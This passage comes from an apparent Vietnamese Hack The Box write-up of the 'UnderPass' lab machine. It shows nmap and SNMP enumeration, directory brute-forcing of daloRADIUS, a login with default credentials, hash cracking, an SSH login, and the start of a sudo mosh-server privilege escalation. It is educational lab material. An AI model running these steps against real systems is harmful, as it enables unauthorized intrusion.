+</span></span><span class="line"><span class="cl"><span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo<span class="o">=</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
+</span></span><span class="line"><span class="cl">80/tcp open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.52 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: HEAD GET POST OPTIONS
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<p>Thử truy cập port 80 và thử một số cách thức đơn giản để khai thác web này, nhưng về cơ bản là tôi không tìm thấy được gì đặc biệt.</p>
+<p>Sau một lúc tìm kiếm loanh quanh thì tôi lướt đến port 161 trên Hacktricks, và tôi nghĩ đến UDP Scan</p>
+<p>Tôi sẽ thử scan một số port UDP thông dụng</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb-overpass<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmap -sU -p35,161,137,138,69 -sV 10.10.11.48 -oN nmap-udp
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-09 10:35 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.48
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.23s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT    STATE  SERVICE     VERSION
+</span></span><span class="line"><span class="cl">35/udp  closed priv-print
+</span></span><span class="line"><span class="cl">69/udp  closed tftp
+</span></span><span class="line"><span class="cl">137/udp closed netbios-ns
+</span></span><span class="line"><span class="cl">138/udp closed netbios-dgm
+</span></span><span class="line"><span class="cl">161/udp open   snmp        SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.68 seconds</span></span></code></pre></div></div>
+<p>Vậy là tôi có port 161 đang mở</p>
+
+<h2 class="relative group">Enumeration and Gaining access
+    <div id="enumeration-and-gaining-access" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#enumeration-and-gaining-access" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Sử dụng <code>snmpwalk</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/htb-overpass]
+</span></span><span class="line"><span class="cl">└─$ snmpwalk -v 1 -c public underpass.htb
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.1.0 = STRING: &#34;Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.3.0 = Timeticks: (10535620) 1 day, 5:15:56.20
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.4.0 = STRING: &#34;steve@underpass.htb&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.5.0 = STRING: &#34;UnDerPass.htb is the only daloradius server in the basin!&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.6.0 = STRING: &#34;Nevada, U.S.A. but not Vegas&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.1 = STRING: &#34;The SNMP Management Architecture MIB.&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.2 = STRING: &#34;The MIB for Message Processing and Dispatching.&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.3 = STRING: &#34;The management information definitions for the SNMP User-based Security Model.&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.4 = STRING: &#34;The MIB module for SNMPv2 entities&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.5 = STRING: &#34;View-based Access Control Model for SNMP.&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.6 = STRING: &#34;The MIB module for managing TCP implementations&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.7 = STRING: &#34;The MIB module for managing UDP implementations&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.8 = STRING: &#34;The MIB module for managing IP and ICMP implementations&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.9 = STRING: &#34;The MIB modules for managing SNMP Notification, plus filtering.&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.3.10 = STRING: &#34;The MIB module for logging SNMP Notifications.&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.1.0 = Timeticks: (10537637) 1 day, 5:16:16.37
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 02 09 0F 19 29 00 2B 00 00 
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.4.0 = STRING: &#34;BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+</span></span><span class="line"><span class="cl">&#34;
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217
+</span></span><span class="line"><span class="cl">iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
+</span></span><span class="line"><span class="cl">End of MIB</span></span></code></pre></div></div>
+<p>Tôi nhận được 1 email <em><a href="mailto:steve@underpass.htb" >steve@underpass.htb</a></em> và daloradius server.</p>
+<p>Tìm kiếm thông tin về daloradius server, <a href="https://github.com/lirantal/daloradius"  target="_blank" rel="noreferrer">daloRADIUS</a> là một giao diện web mã nguồn mở để quản lý <strong>FreeRADIUS</strong>, giúp người dùng dễ dàng quản lý <strong>tài khoản, phiên đăng nhập, log và báo cáo</strong> của hệ thống RADIUS. Nó được viết bằng PHP và hỗ trợ cơ sở dữ liệu <strong>MySQL, PostgreSQL, SQLite</strong>.</p>
+<p>Kiểm tra mã nguồn của nó, tôi tìm thấy 1 số path mà có thể hữu ích: trong <code>/app</code> có <code>/users</code>. Tuy nhiên truy cập trên web thì không có path này</p>
+<p>Thử một số path khác thì tôi nhận được</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="forbidden"
+    width="651"
+    height="267"
+    src="/ctf/hackthebox/underpass/403.png"
+    srcset="/ctf/hackthebox/underpass/403.png 800w, /ctf/hackthebox/underpass/403.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/underpass/403.png"></figure>
+<p>Sử dụng <code>feroxbuster</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb-overpass<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ feroxbuster -u http://underpass.htb/daloradius
+</span></span><span class="line"><span class="cl">                                                                                                                                                                                             
+</span></span><span class="line"><span class="cl"> ___  ___  __   __     __      __         __   ___
+</span></span><span class="line"><span class="cl"><span class="p">|</span>__  <span class="p">|</span>__  <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ <span class="p">|</span> <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>__
+</span></span><span class="line"><span class="cl"><span class="p">|</span>    <span class="p">|</span>___ <span class="p">|</span>  <span class="se">\ </span><span class="p">|</span>  <span class="se">\ </span><span class="p">|</span> <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span><span class="p">|</span> <span class="p">|</span>__/ <span class="p">|</span>___
+</span></span><span class="line"><span class="cl">by Ben <span class="s2">&#34;epi&#34;</span> Risher 🤓                 ver: 2.11.0
+</span></span><span class="line"><span class="cl">───────────────────────────┬──────────────────────
+</span></span><span class="line"><span class="cl"> 🎯  Target Url            │ http://underpass.htb/daloradius
+</span></span><span class="line"><span class="cl"> 🚀  Threads               │ <span class="m">50</span>
+</span></span><span class="line"><span class="cl"> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+</span></span><span class="line"><span class="cl"> 👌  Status Codes          │ All Status Codes!
+</span></span><span class="line"><span class="cl"> 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ <span class="m">7</span>
+</span></span><span class="line"><span class="cl"> 🦡  User-Agent            │ feroxbuster/2.11.0
+</span></span><span class="line"><span class="cl"> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+</span></span><span class="line"><span class="cl"> 🔎  Extract Links         │ <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"> 🏁  HTTP methods          │ <span class="o">[</span>GET<span class="o">]</span>
+</span></span><span class="line"><span class="cl"> 🔃  Recursion Depth       │ <span class="m">4</span>
+</span></span><span class="line"><span class="cl">───────────────────────────┴──────────────────────
+</span></span><span class="line"><span class="cl"> 🏁  Press <span class="o">[</span>ENTER<span class="o">]</span> to use the Scan Management Menu™
+</span></span><span class="line"><span class="cl">──────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl"><span class="m">404</span>      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with --dont-filter
+</span></span><span class="line"><span class="cl"><span class="m">403</span>      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter<span class="p">;</span> toggle off with --dont-filter
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      319c http://underpass.htb/daloradius <span class="o">=</span>&gt; http://underpass.htb/daloradius/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      323c http://underpass.htb/daloradius/doc <span class="o">=</span>&gt; http://underpass.htb/daloradius/doc/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      325c http://underpass.htb/daloradius/setup <span class="o">=</span>&gt; http://underpass.htb/daloradius/setup/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      323c http://underpass.htb/daloradius/app <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      327c http://underpass.htb/daloradius/library <span class="o">=</span>&gt; http://underpass.htb/daloradius/library/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      330c http://underpass.htb/daloradius/app/common <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/common/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      329c http://underpass.htb/daloradius/app/users <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      337c http://underpass.htb/daloradius/app/users/include <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/include/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/include/config <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/include/config/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      336c http://underpass.htb/daloradius/app/users/static <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/static/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/include/common <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/include/common/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      334c http://underpass.htb/daloradius/app/users/lang <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/lang/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      327c http://underpass.htb/daloradius/contrib <span class="o">=</span>&gt; http://underpass.htb/daloradius/contrib/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      337c http://underpass.htb/daloradius/app/users/library <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/library/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      335c http://underpass.htb/daloradius/contrib/scripts <span class="o">=</span>&gt; http://underpass.htb/daloradius/contrib/scripts/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      330c http://underpass.htb/daloradius/contrib/db <span class="o">=</span>&gt; http://underpass.htb/daloradius/contrib/db/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      342c http://underpass.htb/daloradius/app/users/include/menu <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/include/menu/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      343c http://underpass.htb/daloradius/app/users/static/images <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/static/images/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      339c http://underpass.htb/daloradius/app/users/static/js <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/static/js/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      348c http://underpass.htb/daloradius/app/users/library/javascript <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/library/javascript/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      331c http://underpass.htb/daloradius/doc/install <span class="o">=</span>&gt; http://underpass.htb/daloradius/doc/install/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      338c http://underpass.htb/daloradius/app/common/library <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/common/library/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      347c http://underpass.htb/daloradius/contrib/scripts/maintenance <span class="o">=</span>&gt; http://underpass.htb/daloradius/contrib/scripts/maintenance/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      348c http://underpass.htb/daloradius/app/common/library/phpmailer <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/common/library/phpmailer/
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      343c http://underpass.htb/daloradius/app/users/notifications <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/notifications/
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET      247l     1010w     7814c http://underpass.htb/daloradius/doc/install/INSTALL
+</span></span><span class="line"><span class="cl"><span class="m">301</span>      GET        9l       28w      344c http://underpass.htb/daloradius/app/users/library/graphs <span class="o">=</span>&gt; http://underpass.htb/daloradius/app/users/library/graphs/</span></span></code></pre></div></div>
+<p>Về cơ bản thì mã nguồn được chứa trong thư mục <code>/daloradius/</code></p>
+<p>Sau khi ngụp lặn trong mã nguồn thì tôi nhận thấy các config cũng như các phần quản lý nằm trong <code>/operators/</code></p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="login"
+    width="1580"
+    height="706"
+    src="/ctf/hackthebox/underpass/login_hu_2830a05c0d98c9db.png"
+    srcset="/ctf/hackthebox/underpass/login_hu_2830a05c0d98c9db.png 800w, /ctf/hackthebox/underpass/login_hu_f2f05aa3b9b45f07.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/underpass/login.png"></figure>
+<p>Vẫn là trong mã nguồn và cả trong các Issues, tôi tìm thấy thông tin đăng nhập mặc định <code>administrator:radius</code> và thử đăng nhập vào nó</p>
+<p>Boom&hellip;</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="radius"
+    width="1899"
+    height="589"
+    src="/ctf/hackthebox/underpass/radius_hu_10dd70afb354899b.png"
+    srcset="/ctf/hackthebox/underpass/radius_hu_10dd70afb354899b.png 800w, /ctf/hackthebox/underpass/radius_hu_7f7dce0131ef528d.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/underpass/radius.png"></figure>
+
+<h2 class="relative group">SSH and User flag
+    <div id="ssh-and-user-flag" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ssh-and-user-flag" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p>Kiểm tra users list, tôi có 1 user và password</p>
+<figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="svcmosh"
+    width="1495"
+    height="472"
+    src="/ctf/hackthebox/underpass/svcmosh_hu_baf76342ea2602c3.png"
+    srcset="/ctf/hackthebox/underpass/svcmosh_hu_baf76342ea2602c3.png 800w, /ctf/hackthebox/underpass/svcmosh_hu_7d476ddeb68bd686.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/ctf/hackthebox/underpass/svcmosh.png"></figure>
+<p>Copy password này vào Crackstation và tôi nhận được pass của user svcMosh</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/htb-overpass<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh svcMosh@10.10.11.48
+</span></span><span class="line"><span class="cl">svcMosh@10.10.11.48<span class="err">&#39;</span>s password: 
+</span></span><span class="line"><span class="cl">Welcome to Ubuntu 22.04.5 LTS <span class="o">(</span>GNU/Linux 5.15.0-126-generic x86_64<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> * Documentation:  https://help.ubuntu.com
+</span></span><span class="line"><span class="cl"> * Management:     https://landscape.canonical.com
+</span></span><span class="line"><span class="cl"> * Support:        https://ubuntu.com/pro
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> System information as of Mon Feb <span class="m">10</span> 09:07:51 AM UTC <span class="m">2025</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  System load:  0.19              Processes:             <span class="m">253</span>
+</span></span><span class="line"><span class="cl">  Usage of /:   71.6% of 6.56GB   Users logged in:       <span class="m">1</span>
+</span></span><span class="line"><span class="cl">  Memory usage: 31%               IPv4 address <span class="k">for</span> eth0: 10.10.11.48
+</span></span><span class="line"><span class="cl">  Swap usage:   0%
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Expanded Security Maintenance <span class="k">for</span> Applications is not enabled.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">0</span> updates can be applied immediately.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Enable ESM Apps to receive additional future security updates.
+</span></span><span class="line"><span class="cl">See https://ubuntu.com/esm or run: sudo pro status
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">The list of available updates is more than a week old.
+</span></span><span class="line"><span class="cl">To check <span class="k">for</span> new updates run: sudo apt update
+</span></span><span class="line"><span class="cl">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Last login: Mon Feb <span class="m">10</span> 06:36:04 <span class="m">2025</span> from 10.10.16.25
+</span></span><span class="line"><span class="cl">svcMosh@underpass:~$ ls
+</span></span><span class="line"><span class="cl">traitor-amd64  user.txt</span></span></code></pre></div></div>
+
+<h2 class="relative group">Privilege escalation
+    <div id="privilege-escalation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#privilege-escalation" aria-label="Anchor">#</a>
+    </span>
+    
+</h2>
+<p><code>sudo -l</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svcMosh@underpass:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> svcMosh on localhost:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User svcMosh may run the following commands on localhost:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/mosh-server</span></span></code></pre></div></div>
+<p><code>crontab</code></p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svcMosh@underpass:~$ cat /etc/crontab 
+</span></span><span class="line"><span class="cl"><span class="c1"># /etc/crontab: system-wide crontab</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># command to install the new version when you edit this file</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># that none of the other crontabs do.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">SHELL</span><span class="o">=</span>/bin/sh
+</span></span><span class="line"><span class="cl"><span class="c1"># You can also override PATH, but by default, newer versions inherit it from the environment</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Example of job definition:</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># .---------------- minute (0 - 59)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># |  .------------- hour (0 - 23)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># |  |  .---------- day of month (1 - 31)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># |  |  |  |  |</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># *  *  *  *  * user-name command to be executed</span>
+</span></span><span class="line"><span class="cl"><span class="m">17</span> *    * * *   root    <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span class="line"><span class="cl"><span class="m">25</span> <span class="m">6</span>    * * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.daily <span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">47</span> <span class="m">6</span>    * * <span class="m">7</span>   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="m">52</span> <span class="m">6</span>    <span class="m">1</span> * *   root    <span class="nb">test</span> -x /usr/sbin/anacron <span class="o">||</span> <span class="o">(</span> <span class="nb">cd</span> / <span class="o">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#* * * * *  root mosh --local 127.0.0.1</span></span></span></code></pre></div></div>
+<p>Với <code>sudo -l</code> tôi có thể chạy mosh-server với quyền <code>root</code>. <code>crontab</code> truy cập localhost thông qua mosh. <em>Mosh</em> cũng tương tự như SSH cho phép truy cập vào server thông qua username và password</p>
+<p>Tôi tìm thấy cách leo thang đặc quyền với <em>Mosh</em> ở <a href="https://medium.com/@momo334678/mosh-server-sudo-privilege-escalation-82ef833bb246"  target="_blank" rel="noreferrer">đây</a></p>
+<p>Đầu tiên tạo một mosh-server mới với port được chỉ định</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">svcMosh@underpass:~$ sudo /usr/bin/mosh-server new -i 127.0.0.1 -p <span class="m">60010</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
